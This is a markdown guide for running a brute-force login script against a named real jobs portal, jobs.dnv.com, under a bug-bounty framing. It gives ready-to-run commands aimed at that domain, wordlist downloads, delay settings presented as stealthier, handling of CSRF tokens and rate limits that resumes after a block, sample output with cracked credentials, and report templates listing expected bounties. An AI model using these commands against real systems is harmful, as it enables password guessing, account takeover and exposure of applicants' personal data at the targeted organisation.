# Brute Force Testing Guide - jobs.dnv.com

## 🎯 Purpose

Test the authentication endpoint for:
1. **Weak credentials** - Default/common passwords
2. **Rate limiting** - Does the system block repeated failed attempts?
3. **Account lockout** - Are accounts locked after X failed attempts?
4. **CSRF protection** - Is the token properly validated?

---

## 🔧 Installation

### Install Dependencies:

```bash
# Install required Python packages
pip3 install requests colorama urllib3

# OR use requirements.txt
cat > requirements.txt << EOF
requests>=2.31.0
colorama>=0.4.6
urllib3>=2.0.0
EOF

pip3 install -r requirements.txt
```

---

## 🚀 Usage

### Basic Usage:

```bash
# Make executable
chmod +x bruteforce_login.py

# Run with sample wordlists
python3 bruteforce_login.py \
  -t https://jobs.dnv.com \
  -u sample_users.txt \
  -p sample_passwords.txt
```

### Advanced Usage:

```bash
# Slower (more stealthy, 5 second delay)
python3 bruteforce_login.py \
  -t https://jobs.dnv.com \
  -u sample_users.txt \
  -p sample_passwords.txt \
  -d 5

# Faster (3 second delay, less stealthy)
python3 bruteforce_login.py \
  -t https://jobs.dnv.com \
  -u sample_users.txt \
  -p sample_passwords.txt \
  -d 3

# Custom timeout
python3 bruteforce_login.py \
  -t https://jobs.dnv.com \
  -u sample_users.txt \
  -p sample_passwords.txt \
  --timeout 30
```

### Help:

```bash
python3 bruteforce_login.py --help
```

---

## 📝 Command Line Options

| Option | Description | Default | Example |
|--------|-------------|---------|---------|
| `-t` / `--target` | Target URL | Required | `https://jobs.dnv.com` |
| `-u` / `--userlist` | Username wordlist | Required | `users.txt` |
| `-p` / `--passlist` | Password wordlist | Required | `passwords.txt` |
| `-d` / `--delay` | Delay between requests (seconds) | 2 | `5` |
| `--timeout` | Request timeout (seconds) | 10 | `30` |

---

## 📂 Creating Custom Wordlists

### Username List (users.txt):

```bash
cat > users.txt << EOF
admin
administrator
webmaster
support
test
demo
EOF
```

### Password List (passwords.txt):

```bash
cat > passwords.txt << EOF
password
Password1
admin123
welcome
letmein
EOF
```

### Using Existing Wordlists:

```bash
# Download common wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt -O users.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt -O passwords.txt

# Use them
python3 bruteforce_login.py -t https://jobs.dnv.com -u users.txt -p passwords.txt
```

---

## 🎨 Output Explanation

### During Execution:

```
[+] CSRF Token obtained: 1770782899:2aada82526...
[1/380] Testing: admin:password ✗ Failed
[2/380] Testing: admin:Password1 ✗ Failed
[3/380] Testing: admin:admin123 ✓ SUCCESS

[+] SUCCESS! Valid credentials found!
    Username: admin
    Password: admin123
    Status: 302
    Final URL: https://jobs.dnv.com/dashboard
```

### Success Indicators:

- ✅ **Green ✓** - Login successful
- ❌ **Red ✗** - Login failed
- ⚠️ **Yellow !** - Warning (rate limit, unusual response, etc.)

### Files Created:

1. **bruteforce_results_YYYYMMDD_HHMMSS.txt** - Log of all attempts
2. **success_USERNAME_YYYYMMDD_HHMMSS.html** - HTML response of successful login

---

## 🔍 What the Script Does

### 1. CSRF Token Handling:

The script automatically:
- Fetches the login page
- Extracts the `ccm_token` from HTML
- Includes it in POST requests
- Refreshes token every 10 attempts

### 2. Success Detection:

Checks for these indicators:
- Redirect to `/dashboard`
- Presence of "logout" link
- "Welcome back" message
- Different page structure (larger response)

### 3. Failure Detection:

Checks for:
- "Invalid username or password"
- "Login failed" messages
- Staying on login page
- Error messages

### 4. Rate Limiting Detection:

If detected:
- "Rate limit exceeded" message
- HTTP 429 status
- "Too many attempts" message

Script will sleep for 60 seconds and continue.

### 5. Account Lockout Detection:

If detected:
- "Account locked" message
- "Account disabled" message
- Logs the locked account
- Continues with next username

---

## 🛡️ Responsible Testing

### DO:

✅ Test only authorized targets
✅ Use small wordlists (10-50 entries max)
✅ Implement delays (2-5 seconds minimum)
✅ Stop when valid credentials found
✅ Document findings properly
✅ Report to bug bounty program

### DON'T:

❌ Don't use massive wordlists (thousands of passwords)
❌ Don't use delay < 1 second (causes DoS)
❌ Don't brute force in parallel
❌ Don't continue after finding admin credentials
❌ Don't access user data
❌ Don't test without authorization

---

## 📊 Expected Results

### Scenario 1: No Weak Credentials

```
Total attempts: 380
Successful logins: 0
Time elapsed: 12.67 minutes
```

**Finding:** No weak credentials (GOOD security)
**Report:** "Tested 20 common usernames with 19 common passwords. No weak credentials found."
**Bounty:** $0 (informational)

### Scenario 2: Weak Credentials Found

```
[SUCCESS] admin:admin123
[SUCCESS] test:test123

Total attempts: 380
Successful logins: 2
Time elapsed: 12.67 minutes
```

**Finding:** Multiple accounts with weak passwords (BAD security)
**Report:** "Default admin account accessible with weak password 'admin123'"
**Bounty:** $500 - $2,000 (MEDIUM severity)

### Scenario 3: No Rate Limiting

```
Total attempts: 380
Successful logins: 0
No rate limiting detected
No account lockout detected
```

**Finding:** No brute-force protection (BAD security)
**Report:** "Authentication endpoint has no rate limiting or account lockout after 380 failed attempts"
**Bounty:** $300 - $1,000 (LOW-MEDIUM severity)

### Scenario 4: Rate Limiting Works

```
[!] RATE LIMITED! Sleeping for 60 seconds...
Total attempts: 50
Successful logins: 0
Rate limited after: 50 attempts
```

**Finding:** Rate limiting works (GOOD security)
**Report:** "Rate limiting detected after 50 failed attempts. Unable to continue brute force."
**Bounty:** $0 (informational)

---

## 🎯 What to Report

### Finding #1: Weak Credentials

**Title:** Default Administrator Credentials - jobs.dnv.com

**Description:**
The administrative panel at https://jobs.dnv.com/login is accessible using default credentials.

**Steps to Reproduce:**
1. Navigate to https://jobs.dnv.com/login
2. Enter username: `admin`
3. Enter password: `admin123`
4. Click "Login"
5. Successfully authenticated as administrator

**Impact:**
- Full administrative access to jobs portal
- Ability to view/modify all job listings
- Access to applicant data
- Potential data breach

**Proof:**
- Screenshot of successful login
- Screenshot of admin dashboard
- bruteforce_results_*.txt log file

**Severity:** HIGH
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**Bounty Estimate:** $1,500 - $3,000

---

### Finding #2: No Rate Limiting

**Title:** Missing Brute-Force Protection on Authentication Endpoint

**Description:**
The login endpoint at https://jobs.dnv.com/login/authenticate/concrete does not implement rate limiting or account lockout mechanisms.

**Steps to Reproduce:**
1. Send 100+ failed login attempts to `/login/authenticate/concrete`
2. No rate limiting is triggered
3. No account lockout occurs
4. Can continue indefinitely

**Impact:**
- Allows unlimited password guessing
- Enables credential stuffing attacks
- No protection against brute-force

**Proof:**
- Log showing 380+ attempts with no blocking
- No CAPTCHA challenge
- No temporary lockout

**Severity:** MEDIUM
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
**Bounty Estimate:** $300 - $1,000

---

## 🔧 Troubleshooting

### Issue 1: "Could not extract CSRF token"

**Solution:**
- Login page structure might have changed
- Check `/login` page manually
- Look for `ccm_token` in HTML source
- Update regex pattern in script if needed

### Issue 2: All attempts fail immediately

**Possible causes:**
- Wrong target URL
- CSRF token not being included
- IP blocked/rate limited
- Check bruteforce_results_*.txt for error messages

### Issue 3: Script hangs/times out

**Solution:**
- Increase timeout: `--timeout 30`
- Check if site is accessible: `curl https://jobs.dnv.com/login`
- Try with longer delay: `-d 5`

### Issue 4: False positives

**Solution:**
- Check `success_*.html` files manually
- Verify login actually worked
- Adjust success indicators in code if needed

---

## 📈 Performance Tips

### Optimize for Speed (Use Carefully):

```bash
# Reduce delay (minimum 1 second to avoid DoS)
python3 bruteforce_login.py -t URL -u users.txt -p passwords.txt -d 1
```

### Optimize for Stealth:

```bash
# Increase delay (5+ seconds, looks more like real user)
python3 bruteforce_login.py -t URL -u users.txt -p passwords.txt -d 5
```

### Optimize Wordlists:

```bash
# Test most common passwords first
head -10 /path/to/big-passwords.txt > top10.txt
python3 bruteforce_login.py -t URL -u users.txt -p top10.txt
```

---

## 🎓 Learning Resources

### Understanding Brute Force:

- OWASP: https://owasp.org/www-community/attacks/Brute_force_attack
- NIST Password Guidelines: https://pages.nist.gov/800-63-3/

### Wordlists:

- SecLists: https://github.com/danielmiessler/SecLists
- Probable Wordlists: https://github.com/berzerk0/Probable-Wordlists

### Defensive Measures:

- Rate limiting best practices
- Account lockout policies
- CAPTCHA implementation
- Multi-factor authentication

---

## ⚠️ Legal Disclaimer

**This tool is for AUTHORIZED SECURITY TESTING ONLY.**

You must have explicit permission to test the target system. Unauthorized access to computer systems is illegal in most jurisdictions.

By using this tool, you agree:
- You have authorization to test the target
- You will follow responsible disclosure practices
- You will not cause harm or disruption
- You understand the legal implications

**Use at your own risk. The author assumes no liability.**

---

## 🚀 Quick Start Example

```bash
# 1. Install dependencies
pip3 install requests colorama

# 2. Run with small wordlist (safe for testing)
python3 bruteforce_login.py \
  -t https://jobs.dnv.com \
  -u sample_users.txt \
  -p sample_passwords.txt \
  -d 3

# 3. Check results
cat bruteforce_results_*.txt

# 4. If credentials found, verify manually
# 5. Document findings
# 6. Submit to bug bounty program
```

---

**Good luck with your security testing! 🎯**
